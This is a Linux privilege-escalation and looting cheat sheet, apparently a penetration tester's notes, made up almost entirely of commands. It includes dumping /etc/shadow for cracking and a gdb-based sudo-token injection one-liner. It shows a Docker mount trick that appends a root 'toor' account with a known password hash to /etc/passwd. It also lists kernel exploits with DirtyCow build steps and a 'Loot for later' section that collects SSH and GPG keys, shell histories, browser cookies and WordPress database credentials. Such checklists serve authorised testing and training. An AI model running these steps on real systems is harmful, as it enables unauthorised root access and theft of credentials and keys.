
Hostname `hostname`

## PrivEsc Relevant

##### Users
```bash
cat /etc/passwd
```
##### Hashes
```bash
cat /etc/shadow && cat /etc/security/opasswd
```
`unshadow passwd shadow > unshadowed.txt` 
##### Privileges
```bash
sudo -l
```
Search programs on https://gtfobins.github.io/. Is LD_PRELOAD set?!
##### Working Dir for attack
```bash
find / -writable -type d 2>/dev/null
```
##### SysInfo
```bash
cat /etc/*-release; uname -a
```
##### Files with SUID-Bit set
```bash
find / -perm -u=s -type f 2>/dev/null
```
##### Network interfaces
```bash
ip a
```
##### Gateways
```bash
/sbin/route
```
##### Logged-In Users
```bash
w
```
##### Running processes
```bash
ps aux
```
##### Installed programs
```bash
dpkg -l
```
##### Scheduled tasks
```bash
ls -lah /etc/cron* ; cat /etc/crontab; grep "CRON" /var/log/syslog
```
Are any of those or the scripts within writeable?
##### Sudo injection
This requires a running process with valid sudo token and your uid. But it's easy to test/try.
```bash
echo | sudo -S >/dev/null 2>&1 && cp activate_sudo_token /tmp/ && chmod +x activate_sudo_token && for pid in $(pgrep '^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$' -u "$(id -u)" | grep -v "^$$\$"); do echo "Injecting process $pid -> "$(cat "/proc/$pid/comm") && echo 'call system("echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* >/dev/null 2>&1")' | gdb -q -n -p "$pid" >/dev/null 2>&1; done
```
[Source](https://github.com/nongiach/sudo_inject/blob/master/exploit.sh)
##### Abusing Docker
```bash
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
```
or
```bash
docker run -it --rm -v $PWD:/mnt bash
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd # toor:password
```
##### Abusing Tmux
Requires read access to `/tmp/tmux-1000/default`
```bash
export TMUX=/tmp/tmux-1000/default,1234,0 && tmux ls
```
##### Well-Known Kernel Exploits ([Source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#kernel-exploits))
- Linux Kernel 5.8 < 5.16.11 -> [DirtyPipe](https://www.exploit-db.com/exploits/50808)
- Linux Kernel <= 3.19.0-73.8 -> DirtyCow
	```
	# make dirtycow stable
	echo 0 > /proc/sys/vm/dirty_writeback_centisecs
	g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil # or use https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
	```
- Linux Kernel <= 2.6.36-rc8 -> [RDS](https://www.exploit-db.com/exploits/15285/)
- Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) -> [Full Nelson](https://www.exploit-db.com/exploits/15704/)
- Linux Kernel 2.6.39 < 3.2.2 -> [Mempodipper](https://www.exploit-db.com/exploits/18411)
## Loot for later
##### GPG
```bash
ls /home/*/.gpg/
```
##### SSH
```bash
ls /home/*/.ssh/
```
##### History files
```bash
cat /home/*/.*_history
```
##### Home folder
```bash
ls -al /home/*/; ls -al /root/
```

```bash
find / -user $(id -un) -type f 2>/dev/null | grep -Ev "^/sys|^/run|^/proc"
```
##### Test for X-Server
```bash
pidof X
```
Is there e.g. a browser we can grab cookies/passwords from?
##### Extract Cookies
```
pasco index.dat
```
##### Firewall settings
```bash
sudo iptables -S
```
##### Listeners/Connections
```bash
netstat -anp
```
##### Git
```bash
find / -name ".git" 2>/dev/null (cd to the directories and do "git config --list" )
```
##### Mounted Volumes
```bash
cat /etc/fstab; mount; /bin/lsblk
```
##### Printers
```bash
lpstat -a
```
##### Drivers
```bash
lsmod
```

```bash
/sbin/modinfo [module]
```
##### If Wordpress:
	Look at `wp-config.php`. It contains hardcoded MySQL credentials


# Findings